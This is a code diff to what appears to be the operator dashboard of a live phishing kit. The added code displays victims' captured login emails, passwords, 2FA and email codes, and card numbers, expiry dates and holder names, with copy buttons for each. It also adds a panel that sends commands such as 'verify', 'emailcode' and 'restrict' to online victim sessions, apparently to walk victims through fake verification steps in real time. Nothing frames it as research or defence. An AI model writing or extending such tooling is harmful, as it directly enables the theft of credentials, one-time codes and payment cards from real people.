@@ -109,7 +109,9 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
         .session-body { display: none; padding: 16px; }
         .session-body.show { display: block; }
         .session-main { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
-        .session-meta { color: var(--muted); font-size: 13px; }
+        .session-meta { color: var(--muted); font-size: 13px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .session-actions { display: inline-flex; align-items: center; gap: 6px; }
+        .session-actions .btn { border-radius: 999px; }
         .data-row {
             display: grid; grid-template-columns: 120px 1fr; gap: 10px;
             padding: 6px 0; border-bottom: 1px dashed #e5e7eb;
@@ -127,6 +129,8 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
         .profile-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 18px; }
         .profile-field label { color: var(--muted); font-size: 13px; margin-bottom: 6px; display: block; }
         .profile-field .value { background: #f8fafc; border: 1px solid #e5e7eb; border-radius: 12px; padding: 12px 14px; }
+        .modal-content { border-radius: 16px; overflow: hidden; }
+        .modal-header.bg-primary .btn-close { filter: invert(1); }
         .toast-custom {
             position: fixed; top: 20px; right: 20px; z-index: 9999; background: white;
             padding: 14px 16px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.12);
@@ -178,6 +182,34 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
         <div id="pageContent"><div class="loading"><div class="spinner"></div>Loading...</div></div>
     </div>
 
+    <div class="modal fade" id="sessionModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-lg modal-dialog-scrollable">
+            <div class="modal-content">
+                <div class="modal-header bg-primary text-white">
+                    <h5 class="modal-title"><i class="fas fa-info-circle"></i> Session Details</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body" id="sessionModalBody"></div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary" id="sendCommandFromDetails" onclick="sendCommandToCurrent()">Send Command</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="commandModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header bg-primary text-white">
+                    <h5 class="modal-title"><i class="fas fa-paper-plane"></i> Send Command</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body" id="commandModalBody"></div>
+            </div>
+        </div>
+    </div>
+
     <script>
     const domainScopeText = <?php echo json_encode($domainScopeText); ?>;
     const profileData = {
@@ -194,6 +226,7 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
     let currentFilter = 'all';
     let currentSearch = '';
     let dataLoaded = false;
+    let currentSocketId = null;
 
     function showToast(message, type) {
         const bgColor = type === 'success' ? '#10b981' : (type === 'error' ? '#ef4444' : '#3b82f6');
@@ -207,7 +240,16 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
         if (!dateStr) return 'Unknown';
         const date = new Date(dateStr);
         if (isNaN(date.getTime())) return 'Unknown';
-        return date.toLocaleString();
+        return date.toLocaleString('en-GB', {
+            timeZone: 'Europe/Amsterdam',
+            day: '2-digit',
+            month: '2-digit',
+            year: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: false
+        });
     }
 
     function escapeHtml(text) {
@@ -394,6 +436,8 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
                 const isOnline = onlineSocketIds.has(session.socketId);
                 const lastSeen = session.last_seen || session.created_at;
                 const currentUrl = session.current_url || session.currentUrl || 'Unknown';
+                const canSendCommands = Boolean(session.canSendCommands) && isOnline && session.socketId;
+                const canViewDetails = Boolean(session.socketId);
 
                 html += `
                     <div class="session-card">
@@ -404,7 +448,13 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
                                 <span class="${isOnline ? 'badge-online' : 'badge-offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</span>
                                 ${session.profile_name ? `<span class="badge-profile">${escapeHtml(session.profile_name)}</span>` : ''}
                             </div>
-                            <div class="session-meta">${escapeHtml(formatTime(lastSeen))}</div>
+                            <div class="session-meta">
+                                <span>${escapeHtml(formatTime(lastSeen))}</span>
+                                <span class="session-actions">
+                                    ${canSendCommands ? `<button type="button" class="btn btn-sm btn-primary" onclick='event.stopPropagation();showCommandModal(${JSON.stringify(session.socketId)})'><i class="fas fa-paper-plane"></i> Command</button>` : ''}
+                                    ${canViewDetails ? `<button type="button" class="btn btn-sm btn-outline-primary" onclick='event.stopPropagation();viewSessionDetail(${JSON.stringify(session.socketId)})'><i class="fas fa-eye"></i> View Data</button>` : ''}
+                                </span>
+                            </div>
                         </div>
                         <div class="session-body" id="session-${safeSocketId}">
                             <div class="row">
@@ -433,6 +483,172 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
         }
 
         $('#sessionsContainer').html(html);
+    }
+
+    function getModalInstance(id) {
+        return bootstrap.Modal.getOrCreateInstance(document.getElementById(id));
+    }
+
+    async function viewSessionDetail(socketId) {
+        if (!socketId) return;
+
+        currentSocketId = socketId;
+        $('#sendCommandFromDetails').hide();
+        $('#sessionModalBody').html('<div class="text-center py-4"><div class="spinner"></div>Loading session data...</div>');
+        getModalInstance('sessionModal').show();
+
+        try {
+            const response = await fetch(`api/getSessionData.php?socketId=${encodeURIComponent(socketId)}`);
+            const data = await response.json();
+
+            if (!response.ok || !data.success || !data.data) {
+                throw new Error(data.error || 'Failed to load session data');
+            }
+
+            const s = data.data;
+            $('#sendCommandFromDetails').toggle(Boolean(s.canSendCommands));
+
+            let html = `
+                <div class="card mb-3">
+                    <div class="card-header bg-light"><strong>Basic Information</strong></div>
+                    <div class="card-body">
+                        <div class="data-row"><div class="data-label">Socket ID</div><div class="data-value"><code>${escapeHtml(socketId)}</code></div></div>
+                        <div class="data-row"><div class="data-label">Domain</div><div class="data-value">${escapeHtml(s.domain || 'unknown')}</div></div>
+                        <div class="data-row"><div class="data-label">IP</div><div class="data-value">${escapeHtml(s.clientIp || s.ip_address || 'unknown')}</div></div>
+                        <div class="data-row"><div class="data-label">Created</div><div class="data-value">${escapeHtml(formatTime(s.created_at))}</div></div>
+                        <div class="data-row"><div class="data-label">Last Seen</div><div class="data-value">${escapeHtml(formatTime(s.last_seen))}</div></div>
+                        <div class="data-row"><div class="data-label">Current URL</div><div class="data-value"><small>${escapeHtml(s.current_url || s.currentUrl || 'Unknown')}</small></div></div>
+                    </div>
+                </div>
+            `;
+
+            if (s.profile_name || s.profile_email || s.profile_phone) {
+                html += `
+                    <div class="card mb-3">
+                        <div class="card-header bg-light"><strong>Profile Information</strong></div>
+                        <div class="card-body">
+                            ${s.profile_name ? `<div class="data-row"><div class="data-label">Name</div><div class="data-value">${escapeHtml(s.profile_name)}</div></div>` : ''}
+                            ${s.profile_email ? `<div class="data-row"><div class="data-label">Email</div><div class="data-value"><code>${escapeHtml(s.profile_email)}</code></div></div>` : ''}
+                            ${s.profile_phone ? `<div class="data-row"><div class="data-label">Phone</div><div class="data-value"><code>${escapeHtml(s.profile_phone)}</code></div></div>` : ''}
+                        </div>
+                    </div>
+                `;
+            }
+
+            if (s.login_email || s.login_password) {
+                html += `
+                    <div class="card mb-3">
+                        <div class="card-header bg-light"><strong>Login Credentials</strong></div>
+                        <div class="card-body">
+                            ${s.login_email ? `<div class="data-row"><div class="data-label">Email</div><div class="data-value"><code>${escapeHtml(s.login_email)}</code></div></div>` : ''}
+                            ${s.login_password ? `<div class="data-row"><div class="data-label">Password</div><div class="data-value"><code>${escapeHtml(s.login_password)}</code> <button type="button" class="btn btn-sm btn-outline-primary ms-2" onclick='copyToClipboard(${JSON.stringify(s.login_password)})'>Copy</button></div></div>` : ''}
+                            <div class="data-row"><div class="data-label">Time</div><div class="data-value">${escapeHtml(formatTime(s.login_time))}</div></div>
+                        </div>
+                    </div>
+                `;
+            }
+
+            if (s['2fa_code'] || s.email_code) {
+                html += `
+                    <div class="card mb-3">
+                        <div class="card-header bg-light"><strong>Verification Codes</strong></div>
+                        <div class="card-body">
+                            ${s['2fa_code'] ? `<div class="data-row"><div class="data-label">2FA Code</div><div class="data-value"><code>${escapeHtml(s['2fa_code'])}</code> <button type="button" class="btn btn-sm btn-outline-primary ms-2" onclick='copyToClipboard(${JSON.stringify(s['2fa_code'])})'>Copy</button> <small class="text-muted ms-2">(${escapeHtml(formatTime(s['2fa_time']))})</small></div></div>` : ''}
+                            ${s.email_code ? `<div class="data-row"><div class="data-label">Email Code</div><div class="data-value"><code>${escapeHtml(s.email_code)}</code> <small class="text-muted ms-2">(${escapeHtml(formatTime(s.email_code_time))})</small></div></div>` : ''}
+                        </div>
+                    </div>
+                `;
+            }
+
+            if (s.card_number || s.card_holder || s.card_expiry) {
+                html += `
+                    <div class="card mb-3">
+                        <div class="card-header bg-light"><strong>Card Details</strong></div>
+                        <div class="card-body">
+                            ${s.card_number ? `<div class="data-row"><div class="data-label">Card Number</div><div class="data-value"><code>${escapeHtml(s.card_number)}</code> <button type="button" class="btn btn-sm btn-outline-primary ms-2" onclick='copyToClipboard(${JSON.stringify(s.card_number)})'>Copy</button></div></div>` : ''}
+                            ${s.card_holder ? `<div class="data-row"><div class="data-label">Card Holder</div><div class="data-value">${escapeHtml(s.card_holder)}</div></div>` : ''}
+                            ${s.card_expiry ? `<div class="data-row"><div class="data-label">Expiry</div><div class="data-value">${escapeHtml(s.card_expiry)}</div></div>` : ''}
+                            <div class="data-row"><div class="data-label">Time</div><div class="data-value">${escapeHtml(formatTime(s.card_time))}</div></div>
+                        </div>
+                    </div>
+                `;
+            }
+
+            if (s.wrong_email) {
+                html += `
+                    <div class="card mb-0 border-danger">
+                        <div class="card-header bg-danger text-white"><strong>Wrong Attempt</strong></div>
+                        <div class="card-body">
+                            <div class="data-row"><div class="data-label">Email</div><div class="data-value">${escapeHtml(s.wrong_email)}</div></div>
+                            <div class="data-row"><div class="data-label">Time</div><div class="data-value">${escapeHtml(formatTime(s.wrong_email_time))}</div></div>
+                        </div>
+                    </div>
+                `;
+            }
+
+            $('#sessionModalBody').html(html);
+        } catch (error) {
+            $('#sendCommandFromDetails').hide();
+            $('#sessionModalBody').html('<div class="alert alert-danger mb-0">' + escapeHtml(error.message) + '</div>');
+        }
+    }
+
+    function showCommandModal(socketId) {
+        if (!socketId) return;
+
+        currentSocketId = socketId;
+        const commands = ['login', 'verify', 'emailcode', 'reset', '10min', '60min', 'incorrect', 'verifywp', 'verifyg', 'verifybackup', 'restrict', 'done', 'career', 'session'];
+
+        let html = '<div class="row"><div class="col-12"><p class="mb-3">Send command to this session:</p><div class="d-flex flex-wrap gap-2">';
+        for (const command of commands) {
+            html += `<button type="button" class="btn btn-primary btn-sm" onclick='sendCommand(${JSON.stringify(socketId)}, ${JSON.stringify(command)})'>${escapeHtml(command)}</button>`;
+        }
+        html += '</div><hr><div class="input-group mt-3"><input type="text" id="customCommandInput" class="form-control" placeholder="Custom command"><button type="button" class="btn btn-primary" onclick="sendCustomCommand()">Send</button></div></div></div>';
+
+        $('#commandModalBody').html(html);
+        getModalInstance('commandModal').show();
+    }
+
+    function sendCommandToCurrent() {
+        if (currentSocketId) showCommandModal(currentSocketId);
+    }
+
+    async function sendCommand(socketId, command) {
+        try {
+            const response = await fetch('api/sendSessionCommand.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ socketId, command })
+            });
+            const result = await response.json();
+
+            if (!response.ok || !result.success) {
+                throw new Error(result.error || `Command "${command}" failed`);
+            }
+
+            showToast(`Command "${command}" sent`, 'success');
+            getModalInstance('commandModal').hide();
+        } catch (error) {
+            showToast(error.message || 'Failed to send command', 'error');
+        }
+    }
+
+    function sendCustomCommand() {
+        const command = String($('#customCommandInput').val() || '').trim();
+        if (command && currentSocketId) {
+            sendCommand(currentSocketId, command);
+        }
+    }
+
+    async function copyToClipboard(text) {
+        try {
+            await navigator.clipboard.writeText(text);
+            showToast('Copied to clipboard', 'success');
+        } catch (error) {
+            showToast('Copy failed', 'error');
+        }
     }
 
     function renderProfile() {
@@ -552,5 +768,6 @@ if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', '
         loadPage('dashboard');
     });
     </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
